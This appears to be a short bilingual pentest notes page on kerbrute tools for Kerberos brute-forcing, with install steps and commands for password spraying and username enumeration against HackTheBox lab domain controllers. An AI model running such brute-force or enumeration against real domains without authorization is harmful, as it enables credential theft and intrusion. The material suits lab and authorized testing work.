https://github.com/TarlogicSecurity/kerbrute

* Mejor (https://github.com/ropnop/kerbrute)

# kerbrute

An script to perform kerberos bruteforcing by using the Impacket library.

When is executed, as input it receives a user or list of users and a password or list of password. Then is performs a brute-force attack to enumerate:

-   Valid username/passwords pairs
-   Valid usernames
-   Usernames without pre-authentication required

As a result, the script generates a list of valid credentials discovered, and the TGT's generated due those valid credentials.

## Installation
From repo:

```
git clone https://github.com/TarlogicSecurity/kerbrute
cd kerbrute
pip install -r requirements.txt
```

## Use
```
kerbrute -user SVC_TGS -passwords passwords.txt -domain active.htb -dc-ip 10.10.10.100
```

## Instalación de /ropnop/kerbrute
`git clone https://github.com/ropnop/kerbrute`
`cd kerbrute`
`go build -ldflags "-s -w" .`
`upx brute kerbrute`

## Uso de /ropnop/kerbrute
https://github.com/ropnop/kerbrute

`./kerbrute`
Enumeración de usuarios válidos en el sistema, donde users.txt es un listado de posibles usuarios.
`./kerbrute userenum --dc 10.10.10.192 -d blackfield.local users.txt`